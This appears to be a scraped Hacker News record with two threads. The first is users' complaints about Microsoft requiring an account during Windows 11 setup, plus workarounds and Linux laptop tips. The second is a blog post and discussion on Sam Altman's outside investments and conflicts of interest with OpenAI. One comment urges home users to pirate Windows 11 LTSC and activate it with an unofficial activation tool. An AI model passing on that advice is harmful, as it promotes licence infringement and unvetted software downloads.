https://en.wikipedia.org/wiki/Whataboutism reply thefz 7 hours agorootparentThe comment I reply to is. reply raxxorraxor 9 hours agoprevI just recently had to reinstall it a second time because my first image didn't let me past the account registration. It specifically stated that an internet connection is required and there was no way around it. On a notebook where neither ethernet nor wlan worked out of the box btw, I had to install them manually. That wouldn't have been possible with the old install. While I had an adapter to enable networking just fine, I opted to reinstall with a cleaned image. This is really bad work, Microsoft... maybe think about why your users are looking for workarounds here. And no, I do not want secure boot either, thank you very much. reply vbezhenar 8 hours agoparentThere’s a way around it. It’s specifically made by MS. You invoke cmd with special shortcut and execute bat-file bundled in installer which adds one key to registry and restarts an installer. I don’t know if it’s an officially supported way, but given the fact that MS put all the necessary scripts and implemented it, it can’t be a coincidence. reply dgellow 8 hours agoparentprevAs far as I’m aware you can still manually disable the internet connection and get a local install: https://www.tomshardware.com/how-to/install-windows-11-witho... Yes it’s a real pain and it should be way simpler to do. Microsoft makes it pretty hard to like windows… reply glimshe 8 hours agorootparentThat's how I installed Windows on one those mini PCs you can get from Amazon for $150. The trick, which required no fake account, came in the computer instructions. Additionally have in mind you can create a random account for free for each computer you buy. That's what I do for my TVs when using YouTube. reply dtx1 8 hours agoparentprevWhats the issue with Secure Boot? That's an actually good idea security wise. reply raxxorraxor 7 hours agorootparentNah. While ensuring the integrity of your boot partition can be a security benefit, it isn't really the most attractive target for malware anymore. And instead most use cases are levelled against you. For example some computer games now require Windows 11 and secure boot to be enabled for remote attestation. If the mechanism becomes more pervasive, we will see more of that. That is very likely the main motivation of Microsoft here as well. And while there are enough methods for device identification and fingerprinting, I don't want my device to be cooperative here. I do not have evil maids either and the whole trusted computing stuff is badly designed, intransparent and mostly security fluff. I do understand the security benefit for enterprises and disk encryption, but I use alternatives for security. Also Microsoft defacto has control about allowed and allegedly secure distributions. Yes, you can add your own key, but that will probably be as viable as running your own CA at some point. Overall it just makes open computing more complicated and the security gain is negligible. edit: No idea why you were downvoted. Many believe trusted computing to \"just\" increase security. But the intentions and mechanisms behind that aren't as neutral as some would like you to believe. There are also other fights like AMD Pluton, which really lowers the desirability of AMD hardware for me. I though they could have been an alternative for Intel, which is fairly needed. But their developments aren't attractive if they invest in such technologies. I also forgot that a TPM has an endorsement key that is used as a hardware ID. It cannot be changed by the user. The whole setup is a scam and scams are a security threat. Secure boot and trusted computing should die, there are better ways to secure system integrity. reply guappa 6 hours agorootparentprevIf you can tell me how to put your own public key in there, without spending hours on google; I will agree that it is a good idea security wise. reply Am4TIfIsER0ppos 8 hours agorootparentprevNo it isn't. It is allowing microsoft the only authority to allow you to run software of your choice on your own hardware. reply flacebo 7 hours agoprevLittle bit off topic, sorry. Windows 10 support ending in 2025 is really scary. Literally billions of computers are not eligible to install Windows 11 because of artificial limitations, all of these are supposed to be trashed? That would be an enormous amount of e-waste. Realistically one or a combination of the following will happen: - Microsoft extends the deadline - There will be a paid long term support update channel, and hopefully a registry edit will enable this (happened a couple of times before) - Most people will continue to use it without security updates (most likely) I guess Microsoft will agressively tell you that your OS is not safe, etc, so hopefully a single tool will exist that hides all of these messages and switches to the long term support updates. reply nunez 5 hours agoparentWe've been here before with Windows XP. It'll be fine. reply devsda 4 hours agoparentprevMay be and just may be, those users will then try some linux distros and realize that it's not so bad and stick with it. Hope that will drive linux adoption a little more. reply guappa 6 hours agoparentprevWell… KDE is green! https://eco.kde.org/ reply xjay 7 hours agoprevWindows should be broken up. \"Windows 11 Platform\" for applications, drivers, security updates, and gaming. No (forced) Microsoft account. Only security updates. \"Windows 11 Plus\" is a subscription model for enhanced features. What their system requirements tell consumers: > Windows 11 Pro for personal use and Windows 11 Home require internet connectivity and a Microsoft account during initial device setup. [1] [1] https://www.microsoft.com/en-us/windows/windows-11-specifica... reply Moldoteck 8 hours agoprevI've recently bought a windows laptop for my grandparents and it had W11... It looked bloated af... Had to change some bios settings to install some older version of windows 10 so that the system would look similar to what they know, but I'm thinking next time I'll just install Ubuntu + maybe some skin + rustdesk to help them if needed and deal with it reply hans_castorp 8 hours agoprevIt really seems Microsoft is trying hard to push users to Linux (or other alternatives) reply proneb1rd 8 hours agoparentIt's amazing how they keep digging their own grave. reply orphea 8 hours agorootparentDon't forget that we all are in an echo chamber. Most people are not pushed anywhere, they don't care. They don't even know that Microsoft is hostile. reply guappa 6 hours agorootparentThey care. They don't know what to do about it. reply devsda 8 hours agorootparentprevYeah. Only MS knows the actual impact of their decisions. The fact that they are removing a workaround says that it doesn't impact them much i.e. their actual users don't care. Despite all these shenanigans, their regular users will be oblivious to the harm and power users will still grudgingly use it. reply hans_castorp 8 hours agorootparentI guess(!), MS makes most of their profit from Windows licenses with enterprise licenses, where all users are managed through ActiveDirectory. If that assumption is correct, then I guess the financial losses of private users not migrating to Windows 11 might be negligible. reply Ekaros 7 hours agorootparentHow many actual retail licenses they sell? Either retail or individual OEM. As with pre-builds for consumer market license is already there. And lot of home builders just go for grey market which have fraction of retail price. Even Home is not exactly cheapest product if bought retail from regular reseller. reply mavhc 6 hours agoparentprevNot like users are paying for Windows unless they buy a computer with it on already, they don't care about the 0.1% who build their own computer, when they can get 2% of people to use OneDrive and then pay monthly for a service reply Am4TIfIsER0ppos 8 hours agoparentprevlol most users will swallow anything microsoft gives them reply benterix 8 hours agoprevThey go exactly according to the plan. Now you officially don't own your own personal computer. reply account42 7 hours agoparentI look forward to see people getting banned from their own computers. reply npteljes 6 hours agoprevWell, I'll personally weather this storm on my Windows 10 LTSC 21H2. I'm sure people will figure out something until 2027-01-12, when its security supports end, or Microsoft will release the Win 11 LTSC-equivalent. reply ofrzeta 3 hours agoprevSomehow I managed getting through the setup of a 2nd hand laptop that came with Win 11 preinstalled. At one point they wanted me to enter a Microsoft account but through back and forth I somehow was able to skip it although I couldn't reproduce it. Probably I accidentally did the same as described in the article. Anyway, requiring a Microsoft account sucks and I wonder if it's even legal in the EU (better to ask for forgiveness than permission, I guess, right MS?). Conclusion is, Microsoft sucks as much as ever, even with all the open source and Microsoft loves Linux. reply sigio 2 hours agoprevStill condider windows 2000 to be 'peak windows usability' ... and usable with tiny amounts of ram ;) reply mythz 8 hours agoprevNow that I've started getting Windows 10 EOL Notifications (on aging 2017 hardware), I'll be needing to upgrade to a new Desktop + OS soon. No idea what my next Desktop OS is going to be but definitely don't want ads/spyware in a progressively user hostile OS so it will be the first time where I wont be using Windows as my primary OS. I've been using macOS on my macbooks and deploy exclusively to Linux servers so either OS will be a viable alternative. It will come down to whether Apple can ship compelling M4 H/W at this years WWDC, if they don't I'll be switching to a Linux Desktop OS where it will finally be the year of the Linux Desktop! reply guappa 5 hours agoparentI've been getting harassment to update to 11 (on a machine where secure boot is disabled) for a very long time. Plus harassment to stop using a local account, of course. reply BenjiWiebe 4 hours agorootparentIIRC, there is a pretty simple registry edit that can force Windows to remain on the Windows 20 22H2 update channel, i.e. not prompting to install windows 11. reply EnigmaFlare 8 hours agoprevI'm so happy my brand new computer a few years ago was deemed not powerful enough for Windows 11 so I stayed on 10. Windows for home users is clearly in a death spiral. reply baal80spam 8 hours agoparentUnfortunately (as I really like(d) Windows OS), I agree with you. Once my LTSC is end of life, I'm finally swapping to anything but Windows. reply haunter 7 hours agorootparentWindows 11 LTSC just came out last week and no online account needed reply xg15 8 hours agoprev> It seems that Microsoft is aiming to make the use of Windows 11 dependent on a Microsoft account. In combination with the increased calls for Windows users to finally switch to Windows 11, this appears to be a controversial combination. I want to see if they really manage to force several millions of users out of the blue to make a MS account, against the explicit will of those users. reply quantumspandex 7 hours agoprevAs consumer-hostile as Microsoft's practices are, and that these things needs to be optional, I find linking your Windows to a Microsoft's account still pretty useful. With it you can sync your Windows settings across different devices. You can use Find My Device. You can save your BitLocker's encryption key to the cloud. It helps when you forgot your login password. Copilot AI stuffs,... Turning off telemetry and deinstalling some bloatware requires clicking through a few menus, but it's still a mostly just-work experience compared to the amount of time I need to set up a Linux box. On Linux, configuring the fingerprint to work everywhere requires reading through different online threads and edit a config file. Enabling TPM auto disk decryption involves 10 steps command line. Enabling proprietary video codecs necessitates adding a third party repository. And many other small issues that I have to troubleshoot (shutdown freezing, sddm crashing after wake-up from sleep, PackageKit unable to update package, having to turn on a kernel flag for touchpad to work...). I really want Linux to work for me but still have to decide to use Windows on my personal laptop, coming from someone who has to work with Linux everyday at work. reply haunter 7 hours agoprevWindows 11 LTSC just came out last week and no online account needed (also no crapware, no TPM, no Secure Boot etc.) reply Kim_Bruning 6 hours agoparentI'd buy it, but it seems you can only get a volume license or so? How tricky is that to get? reply haunter 6 hours agorootparentIf you are a home end user just pirate it, iso is available everywhere and you can activate it with MAS https://archive.org/details/Windows11LTSC reply alkonaut 7 hours agoparentprevI assume a new machine with an OEM Windows license doesn't have the possibility to switch it to LTSC? reply haunter 7 hours agorootparentNot but MS doesn't care about home user piracy either. reply jasonvorhe 8 hours agoprevOkay then, I'll just switch my gaming rig to Ubuntu and fiddle with Wine or whatever to get my Quake Champions running. Might take a small performance hit but I'm not going to use Windows with a Microsoft account. Not ever. Not going to happen. reply the4anoni 8 hours agoparentUp to 10% performance hit isn't small. Controversial opinion, but linux isn't good for gaming even in 2024. People who are making such things possible are doing great piece of work, but I would say it's more about gaming industry isn't ready for this. Developers still don't case about linux, performance hit is too big, anti-cheat systems have issues and Linux desktop is too fragmented. OOBE\\BYPASSNRO still works at least reply Kim_Bruning 7 hours agorootparentI think it depends what games you play. Steam actually allows you to return a game if it doesn't run on your system (in fact they have a very generous return policy indeed). GOG is a bit more strict, and a bit more hit-and-miss, but also Mostly Works (tm). The unifying factor is steam and/or heroic games launcher (and one or two others besides), which set up your system to run a particular game. Most of the games I've bought in the past year or so Just Work (tm). Obviously YMMV. When it comes to GOG, hilariously, sometimes installing the windows version _on linux_ is the easier option, what with wine/proton forming the universal compatibility layer. I'm sort of wondering if we might evolve to a point where there's proton-for-windows, and then everyone can just target proton exclusively. reply fragmede 8 hours agoprevIt's worth noting ChromeOS doesn't let you do that either, while MacOS doesn't require an iCloud account. iOS doesn't either, but is pushy about having an iCloud account. Don't know about Android. reply mtlmtlmtlmtl 8 hours agoparentI have a Samsung phone and while I'm allowed not to have a Samsung account, it's pretty pushy(pun intended) about it. There's an eternal notification active that tells me to add one. If I dismiss it, it reappears, either instantly or within a couple minutes. It can be snoozed, but the option to mute it indefinitely is greyed out in the notification manager. The app responsible can't be disabled or uninstalled. I can kill it, but then it's promptly restarted. Currently it has used 2% of the battery since the last charge. I don't even know what a Samsung account is for, but I don't care. Clearly I don't need one because the phone is fine otherwise. reply coffeeling 7 hours agorootparentThey have their own ecosystem of apps and services a la MS, Goog, Apple. reply whywhywhywhy 7 hours agoparentprevMacs are way worse about pushing services on you than they used to it, back in the glory days it was maybe one CTA in the OOBE. Now once every 2 months or so I open Apple Music and get blocked from my local music until I dismiss an Apple Music subscription offer. In general you can tell there is no one at the top in a position to veto this who has the taste to know they should and it's slowly eroding the brand just to hope they get a few more Apple One, Apple Play, Apple News, Apple Fitness+ whatever subs reply HeckFeck 8 hours agoprevSometimes I read the latest news from my adoptive industry and truly ponder the probability that we have been reincarnated in another world's hell. reply kreyenborgi 8 hours agoprevSo what would be a good laptop for Linux these days? reply jonesjohnson 8 hours agoparentA used Thinkpad. (or any other used non-consumer grade laptop) Most companies either rent their laptops or somehow sell them after a couple of years. They are usually in good condition and often the reseller gives you 1-2 years of warranty. I've bought a used X250 for <300€ a couple of years ago and I could not be much happier. Of course, the specs could be a bit better, but for most of my tasks (HW + embedded Linux dev) it's sufficient. For everything else i can spin up some beefy server somewhere in a couple of minutes. And since the hardware is on the market for quite some time, driver issues are mostly resolved. Bonus: used Docking stations and spare power supplies are cheap and the battery can be hot-swapped. Bonus2: since it's already slightly beaten down, making another scratch doesn't hurt as much as if it would've been a shiny new macbook. edit: I think the official term is \"refurbished\". I can't see myself ever buying a new device again. reply trelane 8 hours agoparentprevSystem76 is by far the best that I have found. No litany of kludges to make your Windows laptop mostly functional (e.g. no need to have kernel parameters to work around buggy hardware) No need to look compatibility tables and install guides. It ships with Linux preinstalled and with great support. So if you want Linux that Just Works, this is my recommendation. (Also if you want to DIY it with e.g. Arch, since the hardware supports Linux already.) reply the4anoni 7 hours agoparentprevIt's mostly up to you and your requirements. Most laptops should be fine, that doesn't really matter that much whenever do you use windows or Linux. I think thinkpads are way too over hyped. I would just grab something with good build quality, and specs you need. If you want something really fancy like fingerprint, smartcard reader make sure it's compatible with Linux, that's all. I wouldn't recommend fedora as it uses RPM and SElinux which can be tricky, especially for beginners. I am mid-advanced Linux user, I would went with Linux Mint, no matter is it for me or for somebody totally new. reply christophilus 8 hours agoparentprevI’ve had good experiences with business-grade Dell laptops like the Latitude line. Framework and Thinkpads are generally solid, too. As for distro, Fedora is a great beginner distro. reply gregors 1 hour agoparentprevframework 13 amd cpu. It's great! reply 123yawaworht456 7 hours agoparentprevthat depends entirely on what you do with it. bare 24.04 sits at about 0% CPU / 1 GiB RAM usage. a browser+IDE combo will perfectly fine even on a budget laptop with 4 cores / 8 GB RAM / generic SSD. reply quantumspandex 8 hours agoparentprevYou may look into Framework laptops. reply anthropodie 8 hours agoparentprevCheckout framework laptop reply shoozza 8 hours agoprevI wonder how much work it is to check if Windows was installed with an account and terminate the program in that case. reply the4anoni 8 hours agoprevThey just fixed bug I guess... Unless \"OOBE\\BYPASSNRO\" still works I don't have any problem with that reply aforty 8 hours agoprevSo that means they fixed SMB folder shares with Microsoft accounts, right? reply vezycash 8 hours agoprevThey are trying so hard to de-evolve Windows into iOS and android. reply poikroequ 7 hours agoprevIt really is disgusting that they'll block workarounds like this. Do they REALLY need to force this on the less than 1% of users who might use such workarounds? You can use a program called Rufus to create a bootable flash drive from a Windows ISO which lets you bypass the Microsoft login. reply kawsper 8 hours agoprevWe've been moving our fleet to OSX, I am so tired of dealing with Windows and Microsoft in particular. reply zb3 8 hours agoprevVery good move, seems like Microsoft really embraces Linux nowadays :) reply haspok 8 hours agoprevThis is how Microsoft is fighting piracy: \"So you want to use our software and not pay for it, huh? Fine, but in return we need your personal data and behaviour, and we will show you unwanted ads in the Start menu and other places. Deal?\" reply Filligree 2 hours agoparentNo deal. I paid quite a lot for my windows license. reply short_sells_poo 8 hours agoprev [–] Ultimately, the only reason we need to look at is late stage capitalism (and I say this as someone who believes in the market economy). Windows was the historic money maker at Microsoft, they held all the keys, all the power. The regime is changing however. OSes are more and more commoditised and the money has moved to Cloud and now AI. But there is one rule of the market: you have to post gains every quarter. So what is the Windows team to do? There is no growth to be had anywhere else, so they become increasingly less scrupulous in an effort to squeeze more $$$ out of the product. This is obviously a race to the bottom. They know, we know it, the market knows it. However, as long as the numbers keep going up, the market will reward this self destructive behaviour and the team will indulge it. They aren't stupid, they know that these features are annoying, but they'll keep pushing them to find the optimal point between the users being pissed off and profit going up. The risk is of course that they launch a positive feedback loop of exodus and end up destroying the product in the long term, but in the long term we are all dead and the PMs profiting from these user hostile policies will be long retired... reply irusensei 7 hours agoparentI also suspect one of the driving reasons is to inflate reports. Sony is doing a similar thing by requiring PSN accounts on PC games - its to show their share holders that MAU number go up. reply short_sells_poo 7 hours agorootparentAbsolutely. It's just maximizing some sort of metric that ultimately translates into P&L for the PMs. Everything else is largely irrelevant. If the users bitch and moan, but the PM is getting paid more, they'll be incentivised to keep doing what they are doing. The product may end up dead in 10 years time as the userbase is driven away, but by then everyone responsible is long gone. We can all pontificate about acting differently in their shoes, but I'm honest enough to admit that I wouldn't :D reply Kim_Bruning 6 hours agorootparentBasically you're saying the incentives are misaligned with what's best for the user. This -however- may yet be a fixable problem wrt corporate governance. (And here some people thought misaligned GAI was the biggest threat to human society. But more mundane misalignment problems can crop up anywhere I guess) reply short_sells_poo 5 hours agorootparentYeah. I guess you could say that the focus shifted from Windows the OS being the product to the user also becoming the product. Of course, the users never signed up for this. I'm not sure how to prevent these kind of shenanigans, but it simply comes back to sweet adtech dollars I think. The industry is so huge and pervasive now, that regulating it back into submission is going to be very difficult. 10 years ago, regulation could've been passed that simply prevented adtech from ever becoming as normalized and intrusive as it is these days. Doing it now will cause a massive hit to the valuation of the industry, and these kind of moves tend to be unpopular. Who is going to pull off a campaign that erases hundreds of billions of dollars from the US stock market (and thus people's pensions)? reply the4anoni 7 hours agoparentprev [–] I just miss Windows 7 :( reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Microsoft has blocked a popular workaround that allowed Windows 11 users to create local accounts without a Microsoft account, leading to a continuous loop requiring a valid Microsoft account.",
      "An alternative method using the command \"OOBE\\BYPASSNRO\" during setup still exists but may not be a long-term solution.",
      "This move aligns with Microsoft's push for users to switch to Windows 11 and use Microsoft accounts, raising concerns over user control and privacy."
    ],
    "commentSummary": [
      "Microsoft's requirement for Microsoft accounts during Windows 11 setup has frustrated users who prefer local accounts for privacy and control.",
      "This frustration has led some users to consider alternative operating systems like Linux or macOS, despite their own challenges with hardware compatibility, gaming, and user-friendliness.",
      "Discussions emphasize the trade-offs between Windows' ease of use and Linux's customization and privacy benefits, and critique Microsoft's profit-driven strategies and mandatory online accounts."
    ],
    "points": 159,
    "commentCount": 218,
    "retryCount": 0,
    "time": 1717492210
  },
  {
    "id": 40566605,
    "title": "Sam Altman's Financial Ties to OpenAI Spark Ethical Concerns",
    "originLink": "http://oftheclock.com/sam-altman-lately",
    "originBody": "June 3, 2024 Sam Altman, Lately A few day ago, YCombinator boss Paul Graham posted an image on X1, providing an explanation behind Altman’s departure from YCombinator’s main leadership position. Graham’s attempt to dispel rumors of Altman’s supposed firing didn’t work as well as hoped, with many of the responses reiterating that making him choose between OpenAI & YCombinator still constituted a form of firing. However, the more substantial revelation was a few posts later. While responding to replies, it seems that Graham was informed — and later confirmed — that Altman had, in a pretty clear conflict of interest and obviously unbeknownst to YCombinator leadership, invested a tidy sum of $10 million through YCombinator into OpenAI’s for-profit arm. Not a great look. This morning, the Wall Street Journal went even further with an expose on Altman’s burgeoning business empire, in a piece titled The Opaque Investment Empire Making OpenAI’s Sam Altman Rich. According to the WSJ, Altman has: “…a sprawling investment empire that is becoming a direct beneficiary of OpenAI’s success.” Supposedly to the tune of about $2.8 billion. Now, how does that happen when Altman only makes a small salary from OpenAI, and — according to him & the company — doesn’t directly own any of it? Altman’s personal investments range in everything from nuclear fusion reactor start-up Helion to being the third largest public stake in Reddit. Reddit, one of the companies that has a content-sharing deal in place with OpenAI to train ChatGPT. “A growing number of Altman’s startups do business with OpenAI itself, either as customers or major business partners. The arrangement puts Altman on both sides of deals, creating a mounting list of potential conflicts in which he could personally benefit from OpenAI’s work.” Directly, or indirectly, the streak of intentionally investing in companies that have a conflict of interest doesn’t seem to be declining, either — the exact opposite seems to be true. Consequences of this dynamic can include placing employees in a real awkward situation, even if according to OpenAI he’s recused himself from some of the deals between the ChatGPT developer and outside companies he’s invested in. Even if he’s not involved in the deals directly, the reality that employees now have to consider that their boss is directly affected on each side of a deal by decisions they could make is almost sure to have an influence on the outcome. All while they’re supposed to be working for OpenAI’s benefit specifically. Another article, also issued by the Wall Street Journal, aptly named “The Contradictions of Sam Altman, AI Crusader”, touched on some of these issues in March of last year. In it, his investments in Helion ($375mil) & Retro ($180mil) were stated as being “almost all of his liquid wealth.” He was also known to be apart of other projects — including Worldcoin — though the steep growth of his fortune, going from reported between $500-$700 million in March 2023, to $2.8 billion in less than 12 months later is pretty incredible. Especially given his public stance on the financing’s influence on AI’s development. “He owns no stake in the ChatGPT developer, saying he doesn’t want the seductions of wealth to corrupt the safe development of artificial intelligence, and makes a yearly salary of just $65,000.” The fact that he’s so clearly financially tied to OpenAI through a diverse set of investments kind of throws the idea that he only takes a $65,000 salary for altruistic reasons directly out of the window. It also lends insight to the leadership dust-up last year. In November, OpenAI’s board ousted Altman, in pretty dramatic fashion. This recent piece by The Verge expounds on the initial reasoning of the board that, at the time, didn’t trust Altman. One of the cited reasons was Altman’s failure to inform the board of his ownership of the OpenAI Startup Fund. Seems like there is a pattern here. Transparency is probably something Altman would do well to take steps to personally improve, especially after a majority of the board members who pushed out Altman were, as a result of his deal to return, pushed out themselves, resulting in even less oversight. Less critical oversight, at least. Let’s hope — as Altman would put it — for the safety of artificial intelligence, and therefore humanity as whole, transparency does improve across the board. That’s really all we can ask for, given that asking people to actually put financial gain aside as a motivating factor doesn’t seem to historically work out. Any comments, suggestions or corrections can be sent to: mail@oftheclock.com Ironically, it was presumably to avoid AI scraping of the text — such as OpenAI does to train ChatGPT. ↩ 105 Kudos 105 Kudos",
    "commentLink": "https://news.ycombinator.com/item?id=40566605",
    "commentBody": "Sam Altman, Lately (oftheclock.com)152 points by iamthirsty 23 hours agohidepastfavorite109 comments vasco 20 hours ago> He owns no stake in the ChatGPT developer, saying he doesn’t want the seductions of wealth to corrupt the safe development of artificial intelligence, and makes a yearly salary of just $65,000. > “A growing number of Altman’s startups do business with OpenAI itself, either as customers or major business partners. The arrangement puts Altman on both sides of deals, creating a mounting list of potential conflicts in which he could personally benefit from OpenAI’s work.” If nothing else this idea that a person that is positioned to lead such a company is willing to do it for just $65k for altruistic reasons, backfired. Clearly the person has many incentives to go find profits somewhere else. edit: added second quote to clarify reply iamthirsty 20 hours agoparent> If nothing else this idea that a person that is positioned to lead such a company is willing to do it for just $65k for altruistic reasons, backfired. In my first draft “backfired” is the exact word I used too but thought it would come off as too targeted language against Sam, so I changed it. reply m3kw9 20 hours agoparentprevI’m struggling to understand what backfired reply chrishare 20 hours agorootparentHe's saying the attempt to virtue signal, via the low salary, is invalidated by these deals. The virtues would be mostly altruism I guess, that the AGI mission was important enough to humanity for him to sacrifice opportunities to build personal wealth and so on. I think that's overblown personally, but certainly Altman would often repeat the line about having low salary and no equity. reply FireBeyond 19 hours agorootparentAnd it's a lot easy to even fake virtue signal your low salary when in the last three years you've bought: a $27M home in San Francisco, a $16M \"weekend ranch\" in Napa, and a $43M estate in Hawaii. reply wslh 20 hours agoparentprevAltruism? reply JumpCrisscross 20 hours agorootparentAltman isn't an Effective Altruist. reply sangnoir 20 hours agorootparent> Altman isn't an Effective Altruist Or any type of small-a altruist, really. Which is in direct conflict of the image he wishes/wished to portray by \"only\" officially getting a bay-area-intern-level salary with no equity. reply pseudalopex 18 hours agorootparentprevDid they edit their comment? Or did you assume altruism meant Effective Altruism? reply JumpCrisscross 15 hours agorootparent> Did they edit their comment? Yes. reply iamthirsty 20 hours agoprevThe author here, just want to clarify: The post is not a “hit-piece” on Sam, nor am I calling him a bad person or anything of the like. It’s a discussion of the direct contradiction between publicly stating someone is without financial biases and the hard facts of clear financial entanglements. I’m happy to hear any criticism on how I could’ve written it better to explain my position! :) reply quitit 19 hours agoparentThe tech community is inherently cynical, not because we dwell in basements and fear sunlight, but because we've been around long enough to see the corruptive effects of the big business side of tech. The article is well balanced and in my opinion doesn't exhibit a sense of bias. It's clear you're not alone in noticing the dots on the graph are forming a line. Some may say that merely shining a light on the topic, rather than something more virtuous, is a form of bias. I tend to disagree with those assessments due to the aforementioned reasons. We're all adults, we can hold a complex view of Sam Altman. It's not about putting him in a good or bad box, but being aware that he does have financial ties to all of this (avoidable or otherwise) and that is the lens we may need to evaluate some of his decisions by. His actions will ultimately tell his story. That said, HN can be a little too suspicious and it does frequently trump up malice in the benign. reply ml-anon 9 hours agoparentprevHonestly its mindboggling how uncritical most of the folks here are about Sam Altman and Paul Graham and somehow giving billionaires who have been caught in multiple lies the benefit of the doubt multiple times. Its unbelievable that apparently no-one has noticed a 10M stake in the hottest company that could well have >10x'd in the meantime. Watching Paul try to handwave it away and pretend he doesn't understand how investments work is incredible. reply sirspacey 14 hours agoparentprevThanks for the open invitation! My reaction to this, and all other discussions on the topic, is that it rings hollow. Here’s why & I’m very curious for your response: Conflict of interest is a fact of life in elite, cutting edge work. “No conflict, no interest” is as old as SV and VC for that reason. It’s a small pool of people who create great companies and invest. How someone structures themselves around that conflict is the signal. Disclosing potential conflicts of interest is the ethical bar and that has been done. Whatever the real reason for the original OpenAI’s board to ouster Sam, the current board has found no wrongdoing on Sam’s part and crucially made no request for him to cease investment activity. My hypothesis: that’s because Sam’s investment is a powerful signal and one the AI startup community greatly benefits from. I do think Sam’s virtue signaling before Congress has painted Sam into a corner here, but we keep shining the flashlight on it and coming out with the same conclusion: Sam is studious about governance and an astute risk taker. Even the latest ScarJo incident shows that. I don’t see how OpenAI could do better for CEO. It is possible for Sam to take both positions. 1. Not taking financial gains from OpenAI so that his decisions are guided by building safe AGI 2. Investing in companies that are betting on trends he has the most conviction and knowledge about Perhaps a simple test is- is the moral hazard here worse than owning stock in OpenAI? If we don’t expect luminaires to be anything other than people, the OpenAI team’s convergence to bring Sam back is the clearest signal anyone could have on who they believe the best leader to bet on is. It’s human nature to find fault and we all have our faults. My concern with making this the hill to die on in critiquing Sam & OpenAI is we feed a narrative that has little explanatory power and perpetuates unrealistic expectations on how life in a position of power works. reply iamthirsty 4 hours agorootparentThanks for your reply! Couple thoughts: > How someone structures themselves around that conflict is the signal. Disclosing potential conflicts of interest is the ethical bar and that has been done. This is kind of the problem though, it hasn't been done. Graham, my example in the post, didn't know YC invested in OpenAI. The previous board didn't know about Altman's ownership of the Startup Fund. His growing investments were, for most of them, published on the WSJ — yesterday. > Whatever the real reason for the original OpenAI’s board to ouster Sam, the current board has found no wrongdoing on Sam’s part and crucially made no request for him to cease investment activity. The original reason was a lack of trust, and the original board was pushed out so he could return. Of course the current board, one built from it's foundation to be much more receptive and docile to Sam's activities and statements. > It is possible for Sam to take both positions. > 1. Not taking financial gains from OpenAI so that his decisions are guided by building safe AGI > 2. Investing in companies that are betting on trends he has the most conviction and knowledge about The whole point here is that the second contradicts the first. If you're still directly making money off OpenAI's decisions & deals, the hand-waving of \"being guided by building safe AGI\" and not money ceases to be trust, because there are clearly billions at stake for Altman. > we feed a narrative that has little explanatory power and perpetuates unrealistic expectations on how life in a position of power works. The thing here is, Sam could realistically be an altruistic monk, not driven by any financial incentive when it comes to AI. There are a ton of different options, if he wants to live up to the standard he set for himself. For example, putting investments into a trust that have to do with AI, not investing in related companies at all, putting a majority of his wealth into a Bill & Malinda Gates-style charity — the list goes on. If had not tried to tell everyone he's doing this for the good of humanity and not money, he could take a multiple million $ salary + a huge personal stake in OpenAI and no one would bat an eye. It's the fact that he himself is position his image to be one thing, which is not the case. reply piva00 11 hours agorootparentprev> It’s human nature to find fault and we all have our faults. My concern with making this the hill to die on in critiquing Sam & OpenAI is we feed a narrative that has little explanatory power and perpetuates unrealistic expectations on how life in a position of power works. Isn't then the criticism about the acceptance that \"life in a position of power works\" this way and is essentially morally corrupt? Couldn't it be better? Greed is among the chief reasons for such conflicts of interest to arise, shouldn't we criticise such aspect and expect better from the \"elites\" in positions of power? Since greed will eventually corrupt we could probably want to expect better from the ones taking positions of power, I personally wouldn't like to accept that this is the best system we can live under, and for it to change we need to criticise it for the optics to change over time. It was once accepted to own slaves, eventually we all landed on the same page: it is morally corrupt to do it, it's unethical. More modern examples like insider trading, stock fraud, were once accepted until we didn't accept it anymore as \"it's the way it is\". I don't see a reason to not strive making other morally corrupt aspects of our systems (such as conflicts of interest) also unethical and frowned upon. People are people and shared ethics is how we level ourselves against each other. reply Lerc 19 hours agoparentprevOk, please take this as constructive criticism of your writing, and not as a counterargument to your position. In your post the comment. > Graham's attempt to dispel rumors of Altman's supposed firing didn't work as well as hoped, with many of the responses reiterating that making him choose between OpenAI & YCombinator still constituted a form of firing. Portrays this as a matter of opinion, when if any single opinion should be considered it should be Paul Graham's since he was the person performing the act. The likely cause for Paul Graham's statement was Helen Toners comments a few days earlier >if Sam did stay in power as he ultimately did you know that would make their lives miserable and I guess the last thing I would say about this is that this actually isn't a new problem for Sam and if you look at some of the reporting that that has come out since November it's come out that he was actually fired from his previous job at Y combinator which was hushed up at the time Which clearly carries the implication that this was an inarguable firing for misdeeds. In this context, it does not matter if being asked to make a choice is technically firing. The main point is that this is a rebuttal of the narrative put forth by Helen Toner. Paul Graham makes this clear >we would have been happy if he stayed So this is how you start out, It places the article within a false narrative, but is not even the topic of the post. It would have been better to more concisely state that the thread containing Paul Graham's statement revealed an additional piece of information. Next you say >While responding to replies, it seems that Graham was informed - and later confirmed - that Altman had, in a pretty clear conflict of interest You are combining a conclusion and evidence here. The evidence shows that Sam Altman has a degree of investment in OpenAI through Y Combinator. You need to make the argument that this was a clear conflict of interest separately, additionally you need to state whether you mean the conflict of interest is referring to when he invested the money as the president of Y Combinator, or later in decision making at OpenAI as a stake holder. >obviously unbeknownst to YCombinator leadership, Is clearly false because at the time Altman was YCombinator leadership himself. >a tidy sum of $10 million Everything is relative, it is worth taking into context how much $10 million represents to the people concerned. In your provided reference, Paul Graham describes the sum as >This was not a very big investment for those funds. I cannot critique the accuracy of your representations of the Wall Street Journal, as it is paywalled. The Gist of the critique is that there are deals between OpenAI and enterprises that Sam Altman has an investment in. It is not uncommon for individuals to be in decision making roles in one company while it does dealings with another in which they have a financial interest. It is not enough to establish that this connection exists for it to be a story. There needs to be some suggestion and evidence that there were decisions that were improperly influenced by the person with the conflict of interest. The typical way to avoid even the appearance of improper influence is for the person to declare their conflict of interest and leave that decision to non conflicted parties. Declarations of conflict of interest are commonplace, because conflicts of interest are not bad in themselves, only when they influence events. If you are alleging that Sam Altman improperly influenced the negotiation with Reddit for data, or any similar conflicted negotiation, then you really have a story. You also need evidence to say that it happened. Even evidence that Sam Altman refused to step aside from such negotiations would be significant news. While he may not have influenced negotiations to his own advantage, being in a position where it appears that it might have happened would generally be considered a lapse in judgement. Barring that evidence. You have a story about someone's investments that have increased in value, which is what people expect their investments to do. reply iamthirsty 18 hours agorootparentThanks for your reply! Couple things: > Which clearly carries the implication that this was an inarguable firing for misdeeds. In this context, it does not matter if being asked to make a choice is technically firing. The main point is that this is a rebuttal of the narrative 